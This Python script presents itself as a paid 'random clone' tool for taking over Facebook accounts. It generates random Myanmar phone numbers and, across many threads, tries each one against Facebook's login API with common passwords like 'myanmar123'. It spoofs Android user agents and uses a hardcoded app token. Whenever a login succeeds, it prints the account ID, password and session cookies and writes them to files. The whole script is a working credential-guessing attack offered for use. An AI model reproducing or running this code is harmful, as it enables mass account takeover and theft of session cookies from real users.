import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
ses=requests.Session()
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen=[]
ugen = []
for x in range(10000):
	a="Mozilla/5.0 (Linux; Android"
	b=random.choice(["4","5","6","7","8","9","10","11","12","13","14"])
	c="22101316G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"
	d=random.randrange(50,103)
	e="0.0"
	f=random.randrange(1111,9999)
	g=random.randrange(111,999)
	h="Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"
	i=random.randrange(111,444)
	j="0.0"
	k=random.randrange(11,99)
	l=random.randrange(11,99)
	m=";]"
	ugent=(f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}{i}.{j}.{k}.{l}{m}')
	ugen.append(ugent)
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

def main():
    os.system('clear')
    print(logo)
    linex()
    print("  \033[38;5;43m\033[1;32m[\033[1;97m1\033[1;32m] \033[1;97mSTART UID CLONE")
    print("  \033[38;5;43m\033[1;32m[\033[1;97m0\033[1;32m] \033[1;91mEXIT TOOL ")
    linex()
    ZWE = input(f'\033[1;32m[\033[1;97m?\033[1;32m] \033[1;97mSELECT \033[•────➤\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["0","X"]:        
        os.system('exit')
def phone():
    user=[]
    os.system('clear')
    print(logo)
    linex()
    print("  \033[38;5;43m\033[1;32m[\033[1;97m✔\033[1;32m]\033[1;97m EXAMPLE \033[38;5;41m ━━ \033[1;32m[\033[1;97m770\033[1;32m] / [\033[1;97m442\033[1;32m] / [\033[1;97m669\033[1;32m] / [\033[1;97m880\033[1;32m]")
    print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code = input('\033[1;32m[\033[1;97m?\033[1;32m]\033[1;97m INPUT YOUR CODE \033[38;5;41m•────➤\033[1;32m ')
    os.system('clear')
    print(logo)
    linex()
    print("  \033[38;5;43m\033[1;32m[\033[1;97m✔\033[1;32m] \033[1;97mEXAMPLE \033[38;5;41m ━━ \033[1;32m[\033[1;97m3000\033[1;32m] / [\033[1;97m5000\033[1;32m] / [\033[1;97m10000\033[1;32m] / [\033[1;97metc..\033[1;32m] ")
    print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit=int(input("\033[1;32m[\033[1;32m?\033[1;32m]\033[1;97m INPUT YOUR LIMIT \033[38;5;41m •────➤ \033[1;32m "))    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=175) as LEE:
        os.system('clear')
        print(logo)
        linex()
        tl = str(len(user))
        print(f'  \033[1;32m[\033[1;91m❃\033[1;32m]\033[1;97m TOTAL ID        \033[38;5;41m ━━━━━    \033[1;32m'+tl+'                  \033[38;5;43m')
        print(f'  \033[1;32m[\033[1;91m❃\033[1;32m]\033[1;97m CHOICE CODE     \033[38;5;41m ━━━━━    \033[1;32m'+code+'                    \033[38;5;43m')
        print(f"  \033[1;32m[\033[1;91m❃\033[1;32m] \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;31mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!          \033[38;5;43m")
        linex()
        for love in user:
            uid = '+959'+code+love
            pwx = [code+love,love,code+love[:3],'myanmar','myanmar123','Myanmar123','Myanmar','kyawkyaw','aungaung','zawzaw','chitchit']
            LEE.submit(rcrack,uid,pwx,tl)

def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\033[1;91m[\033[1;97mKO ZWE\033[1;91m]--[\033[1;97m%s\033[1;91m]--[\033[1;97mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': pro,
            'Accept-Encoding':  'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url1= 'https://b-graph.facebook.com/auth/login'
            lo=session.post(url1,data=data,headers=head).json()
            if 'session_key' in lo:
                coki=";".join(i["name"]+"="+i["value"] for i in lo["session_cookies"])	
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f"\033[1;32;40m[✔] {uid} | {ps}" '  \n\033[1;97m[COOKIE] ━━ \033[1;97m'+coki+  '')
                open('/sdcard/ZWE_Pia-OK.txt', 'a').write( uid+' | '+ps+'\nCookie = '+coki+'\n\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in str(lo):
                print(f"\033[1;31m[✖] {uid} | {ps}")
                open('/sdcard/ZWE_Pia-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass

logo= ("""
\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[1;32m┃\033[38;5;41m ██   ██  ██████      ███████ ██     ██ ███████      \033[1;32m┃
\033[1;32m┃\033[38;5;42m ██  ██  ██    ██        ███  ██     ██ ██           \033[1;32m┃
\033[1;32m┃\033[38;5;43m █████   ██    ██       ███   ██  █  ██ █████        \033[1;32m┃
\033[1;32m┃\033[38;5;44m ██  ██  ██    ██      ███    ██ ███ ██ ██           \033[1;32m┃
\033[1;32m┃\033[38;5;45m ██   ██  ██████      ███████  ███ ███  ███████ \033[0;101mPAID\033[0m\033[38;5;41m ┃
\033[1;32m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
\033[1;32m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mDEVELOPER       \033[38;5;41m ━━━━━    \033[1;32m  WAI LIN OO          \033[1;32m┃
\033[1;32m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL STATUS     \033[38;5;41m ━━━━━    \033[1;32mRANDOM CLONE          \033[1;32m┃
\033[1;32m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTELEGRAM        \033[38;5;41m ━━━━━    \033[1;32m  @WAILINOO1          \033[1;32m┃
\033[1;32m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL VERSION    \033[38;5;41m ━━━━━     \033[1;32m\033[0;104m10.5 \033[1;97m(\033[1;31mPAID\033[1;97m)\033[0m          \033[1;32m┃
\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""") 
def linex():
	print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

main()
